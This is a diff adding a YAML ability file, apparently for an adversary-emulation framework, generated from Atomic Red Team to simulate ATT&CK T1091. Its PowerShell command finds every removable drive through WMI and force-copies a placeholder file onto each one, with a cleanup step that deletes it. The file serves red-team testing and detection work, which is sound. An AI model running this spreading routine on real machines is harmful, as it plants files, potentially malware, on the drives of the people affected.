@@ -1,0 +1,25 @@
+- id: df187d74-6d10-4b9e-8c95-047de47f3ab8
+  name: USB Malware Spread Simulation (Generated from Atomic Red Team)
+  description: |
+    Ability for Replication Through Removable Media (ATT&CK T1091).
+    Simulates an adversary copying malware to all connected removable drives. 
+    Generated from Atomic Red Team procedures (d44b7297-622c-4be8-ad88-ec40d7563c75); review and test safely before use.
+  tactic: initial-access
+  technique:
+    attack_id: T1091
+    name: Replication Through Removable Media
+  platforms:
+    windows:
+      psh:
+        command: |
+          $RemovableDrives=@();
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID;
+          ForEach ($Drive in $RemovableDrives) {
+            write-host "Removable Drive Found:" $Drive;
+            cp "#{location}" "$Drive" -Force;
+          }
+        cleanup: |
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID;
+          ForEach ($Drive in $RemovableDrives) {
+            Remove-Item -Path "$Drive\#{exe_name}" -Force -ErrorAction Ignore
+          }
